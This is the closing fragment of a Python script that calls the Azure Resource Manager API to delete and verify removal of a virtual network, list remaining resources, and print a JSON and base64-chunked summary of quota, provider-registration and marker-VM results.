            sd, rdd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            if sd in (200, 202, 204): break
            time.sleep(8)
        C['vnet_delete_status'] = sd
        last = None
        for i in range(60):
            time.sleep(6)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            if last == 404: break
        C['vnet_absence_status'] = last
    stv, vn = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks?api-version=2024-01-01')
    C['vnets_after'] = {'status': stv, 'names': [v.get('name') for v in (vn.get('value') or [])] if stv == 200 else vn}
    stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
    C['vms_after'] = {'status': stl, 'names': [v.get('name') for v in (lst.get('value') or [])] if stl == 200 else lst}
    R.setdefault('cleanup', []).append(C)
    if marker is not None: marker['cleanup'] = C

def emit(R):
    try:
        blob = json.dumps(R, default=str)
        b64 = base64.b64encode(blob.encode()).decode()
        Q = R.get('quota') or {}
        summ = {'sub': R.get('sub'), 'rg': R.get('rg'),
                'rg_resources_before': {k: (R.get('rg_resources_before') or {}).get(k) for k in ('status', 'count', 'all_names', 'ours')},
                'preclean': R.get('preclean'), 'preclean_after': R.get('preclean_after'),
                'nv4as_v4_regions': R.get('nv4as_v4_regions'), 'quota_target_region': R.get('quota_target_region'),
                'quota_sub_scope': Q.get('sub_scope'),
                'quota_locations': Q.get('locations'),
                'quota_put': Q.get('put'), 'quota_put_alt': Q.get('put_alt'), 'quota_put_legacy': Q.get('put_legacy'),
                'quota_poll_tail': (Q.get('poll') or [])[-6:], 'quota_async_final': Q.get('async_final'),
                'quota_requests': Q.get('requests'), 'quota_verdict': Q.get('verdict'),
                'rp_state': R.get('rp_state'), 'rp_register': R.get('rp_register'), 'rp_registration_poll': R.get('rp_registration_poll'),
                'marker': {k: (R.get('marker') or {}).get(k) for k in ('attempted', 'skipped', 'nonce', 'region', 'sku', 'priority',
                                                                       'provision_state', 'provisioned', 'instance_view_statuses',
                                                                       'runcommand_status', 'device_signals', 'device_evidence',
                                                                       'list_with_marker', 'vm_get', 'cleanup')},
                'rg_resources_after': {k: (R.get('rg_resources_after') or {}).get(k) for k in ('status', 'count', 'all_names', 'ours')},
                'cleanup': R.get('cleanup'), 'finished': R.get('finished')}
        p('C211_%s_SUMMARY ' % INTENT + json.dumps(summ, default=str)[:16000])
        p('C211_%s_RESULT_B64_BEGIN' % INTENT)
        for i in range(0, len(b64), 200): p(b64[i:i+200])
        p('C211_%s_RESULT_B64_END' % INTENT)
    except Exception as e:
        p('C211_%s_EMIT_ERROR ' % INTENT + repr(e))
        try: p('C211_%s_RAW ' % INTENT + json.dumps(R, default=str)[:12000])
        except Exception: pass

if __name__ == '__main__':
    main()
